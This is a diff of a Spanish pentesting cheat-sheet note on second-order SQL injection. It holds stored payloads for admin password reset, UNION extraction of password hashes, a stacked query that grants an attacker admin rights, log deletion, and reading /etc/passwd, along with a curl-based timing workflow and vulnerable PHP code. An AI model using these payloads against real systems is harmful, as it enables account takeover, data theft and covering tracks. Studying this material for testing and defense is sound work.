@@ -1,18 +1,18 @@
 ---
 aliases:
-  - "Second-order SQLi"
+  - Second-order SQLi
 tags:
   - type/technique
   - vuln/sqli
   - technique/execution
   - asset/database
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[SQL Injection (SQLi)]]"
+  - '[[SQL Injection (SQLi)]]'
 ---
 # SQLi - Second order
 
@@ -20,21 +20,75 @@ linked:
 
 ## Cheatsheet
 
-|      **Fase de Ataque**      |                                                           **Acción del Sistema**                                                            |                    **Payload Estructural (Ejemplo)**                    |                                                                          **Lógica de Ejecución y Persistencia**                                                                           |
-|:----------------------------:|:-------------------------------------------------------------------------------------------------------------------------------------------:|:-----------------------------------------------------------------------:|:-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
-|  <br><br>Inserción (Input)   |    <br>La aplicación recibe mi payload y lo procesa mediante una consulta segura (ej. consultas parametrizadas o sanitización inicial).     |       <br>`admin'--` (Registrado como un nuevo nombre de usuario)       |            <br>El payload evade las defensas perimetrales (WAF) y las validaciones de entrada, ya que sintácticamente es un string válido para la primera transacción.<br><br>            |
-| <br>Almacenamiento (Storage) |                     <br>El motor de la base de datos guarda la cadena literal exacta en una tabla y columna específica.                     |  <br>Registro almacenado en la columna `username` de la tabla `users`.  |                                    <br>El ataque entra en un estado latente. En esta etapa no se produce ninguna alteración de la lógica SQL.<br><br>                                     |
-| <br>Recuperación (Retrieval) | <br>Una funcionalidad secundaria del backend (ej. restablecimiento de contraseña, generación de reportes) consulta y lee el dato infectado. |  <br>El backend extrae `admin'--` asignándolo a una variable interna.   |    <br>La vulnerabilidad radica en la confianza absoluta; la aplicación asume erróneamente que cualquier dato proveniente de su propia base de datos es inherentemente seguro.<br><br>    |
-|  <br>Detonación (Execution)  |                  <br>La aplicación concatena el dato recuperado directamente en una nueva sentencia SQL sin parametrizar.                   | <br>`UPDATE users SET password='New' WHERE username='admin'--' AND ...` | <br>El payload se interpreta como código. El operador de comentario anula las condiciones de seguridad originales, afectando en este caso a la cuenta legítima del administrador.<br><br> |
+| **Payload (registrado)** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| Registrar user con username `admin'-- -` | Login posterior con ese username concatena en update/select → bypass o data leak | App con prepared en INSERT pero concat en otras queries. |
+| Registrar user `' UNION SELECT password,NULL,NULL FROM users WHERE username='admin'-- -` | UNION dispara cuando endpoint posterior lee username crudo | Endpoint que pasa username sin sanitizar. |
+| Email registro `a@a.com'; UPDATE users SET role='admin' WHERE username='ATACANTE'-- -` | Stacked query dispara al usar email en query state-changing | Backend permite stacked queries en endpoint diferido. |
+| Bio/profile `'; DELETE FROM logs-- -` | Cleanup de logs cuando profile se renderiza | App renderiza bio sin escape en logging query. |
+| Password reset → `username='admin'-- -` | Reset triggera `WHERE username='admin'-- ...'` → reset password de admin | Endpoint `forgot password` con username concat. |
+| Nombre archivo upload `'; SELECT load_file('/etc/passwd')-- -` | Filename usado en query de metadata posterior dispara la carga | App guarda filename en DB + endpoint reporting concat. |
+| Comment `' OR sleep(5)-- -` | Blind via time delay cuando admin ve el comment | Blind variant — admin panel lee comment sin escape. |
 ^sqli-second
+
+### Workflow identificación
+
+```bash
+TARGET="https://target"
+
+# 1. Mapear inputs persistidos
+#    - Registro: username, email, profile fields
+#    - Comments, posts, mensajes
+#    - Uploads (filename)
+
+# 2. Inyectar marker observable
+# Usar payload que NO rompe la primera transacción (INSERT con prepared):
+MARKER="MARKER_$(date +%s)' OR sleep(5)-- -"
+curl -X POST "$TARGET/register" -d "username=$MARKER&password=x&email=x@x.com"
+
+# 3. Triggerear funciones que leen ese dato
+ENDPOINTS=(
+  "/profile/$MARKER"
+  "/forgot-password"  # con email del marker
+  "/admin/users"      # admin panel lista users
+  "/api/search?q=$MARKER"
+)
+
+for ep in "${ENDPOINTS[@]}"; do
+  T=$(curl -s -o /dev/null -w '%{time_total}' "$TARGET$ep")
+  echo "[$T s] $ep"
+done
+# Endpoint con delay = vector vulnerable
+
+# 4. Refinar payload — extraer data via time-based blind o OOB
+```
+
+### Por qué pasa
+
+```php
+// Registro — PREPARED (seguro)
+$stmt = $pdo->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
+$stmt->execute([$username, $password]);  // payload guardado tal cual
+
+// Reset password — CONCAT (vulnerable)
+$user = getUserById($id);              // ← username = "admin'-- -"
+$query = "UPDATE users SET password='newpass' WHERE username='" . $user->username . "'";
+$pdo->query($query);
+// Resulting query: UPDATE users SET password='newpass' WHERE username='admin'-- -'
+//                                                                  ^^^^^^^^^^^^^ admin's password reseteado
+```
 
 ___
 
 ## Overview
 
-El [[Second-order SQLi]] (o inyección almacenada diferida) es un vector de ataque asíncrono. En lugar de forzar una alteración inmediata en el punto de entrada del flujo de la aplicación, inyecto un payload diseñado para permanecer en reposo dentro de la base de datos.
+**Second-order SQLi** = payload se guarda inerte en DB en primera transacción (con prepared statement). Detona después cuando otro endpoint lee ese valor y lo concatena sin escapar.
 
-La explotación exitosa de este vector requiere identificar asimetrías en las políticas de sanitización del código fuente: la aplicación protege rigurosamente los datos que ingresan desde el exterior (el primer orden), pero concatena de manera insegura los datos cuando los extrae de su propio esquema para construir consultas posteriores (el segundo orden). Por lo tanto, el foco de mi análisis pasa de la inyección directa al mapeo exhaustivo de cómo fluyen y se reutilizan las variables almacenadas a lo largo de toda la lógica de negocio del aplicativo.
+**Vector latente** — no se detecta con scanners típicos que prueban respuesta inmediata. Requiere:
+1. Identificar inputs que se persisten en DB.
+2. Mapear endpoints que leen esos datos.
+3. Diferencia de tratamiento: prepared en INSERT vs concat en SELECT/UPDATE.
 
+**Indicador clave**: app trusts data "from own DB" como segura. Vector típico en passwords reset, admin panels, scheduled jobs, reporting.
 
 ***
